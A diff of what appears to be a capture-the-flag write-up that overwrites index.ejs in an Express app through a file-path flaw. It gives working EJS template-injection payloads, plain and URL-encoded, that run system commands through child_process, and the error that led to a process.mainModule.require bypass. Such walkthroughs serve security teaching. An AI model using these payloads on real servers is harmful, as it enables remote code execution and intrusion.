@@ -178,23 +178,60 @@ path.basename('/foo/bar/baz/asdf/quux.html');
 // Returns: 'quux.html'
 ```
 
-Yes! What can we do? We can overwrite `index.ejs` with our own content because of this vulnerability. We will set `to` parameter to `/index.js`, which will create file `index.ejs` and overwrite current `index.ejs`. We’ll inject malicious code into `index.ejs`, as it is being rendered, and attempt to get `Remote Code Execution (RCE)`. Let’s start working on it nowwwww!
+Yes! What can we do? We can overwrite `index.ejs` with our own content because of this vulnerability. We will set `to` parameter to `/index.js`, which will create file `index.ejs` and overwrite current `index.ejs`. We’ll inject malicious code into `index.ejs` through `msg` parameter, as it is being rendered, and attempt to get `Remote Code Execution (RCE)`. Let’s start working on it nowwwww!
 
 What should our payload be? After doing some research, I found out about the `child_process` module in Node.js. This module allows us to create and control child processes, enabling us to `execute` system commands, `run scripts`, and perform other operations outside the main Node.js process.
 
 Lets create our payload:
 ```
-<%- require(‘child_process’).exec(‘id’) %>
+<%- require('child_process').exec('id') %>
 ```
 
 URL encode it:
 ```
-%3C%25-%20require%28%E2%80%98child_process%E2%80%99%29.exec%28%E2%80%98id%E2%80%99%29%20%25%3E
+%3C%25-%20require%28%27child_process%27%29.exec%28%27id%27%29%20%25%3E
 ```
 
 Then, send the payload like this:
 ```
-/Admin?to=/index.ejs&msg=%3C%25-%20require%28%E2%80%98child_process%E2%80%99%29.exec%28%E2%80%98id%E2%80%99%29%20%25%3E
+/Admin?to=/index.ejs&msg=%3C%25-%20require%28%27child_process%27%29.exec%28%27id%27%29%20%25%3E
 ```
 
-This should allow us to inject and execute the malicious code to get RCE.
+This should have allowed us to inject and execute the malicious code to get RCE.
+
+However, I encountered the following error:
+
+```
+ReferenceError: /tmp/index.ejs:1
+ >> 1| <%- require('child_process').exec('id') %>
+
+require is not defined
+    at eval ("/tmp/index.ejs":10:7)
+    at index (/app/node_modules/ejs/lib/ejs.js:703:17)
+    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:274:36)
+    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:491:10)
+    at View.render (/app/node_modules/express/lib/view.js:135:8)
+    at tryRender (/app/node_modules/express/lib/application.js:657:10)
+    at Function.render (/app/node_modules/express/lib/application.js:609:3)
+    at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)
+    at /app/app.js:59:9
+    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
+```
+The error occurs because `require` is not available in the EJS template context. EJS templates run in the browser or within a restricted context, which does not have access to Node.js modules like `child_process`. This is a security feature to prevent running potentially dangerous server-side code in the template.
+
+Hmmmm! Let’s do more research, and only research. I found a method to use `child_process`. We can do it using `process.mainModule`. It refers to the entry point of the Node.js application, which is the main module that was first loaded when the application started. This module retains access to the original `require` function.
+
+By using `process.mainModule.require`, we're essentially bypassing any restrictions placed on the `require` function in the template rendering context. This gives us access to core Node.js modules, such as `child_process`, which were previously inaccessible.
+
+```
+<%- process.mainModule.require('child_process').execSync('id').toString() %>
+```
+After Encoding:
+```
+%3C%25-%20process.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%20%25%3E
+```
+
+Final Payload like this:
+```
+/Admin?to=/index.ejs&msg=%3C%25-%20process.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%20%25%3E
+```
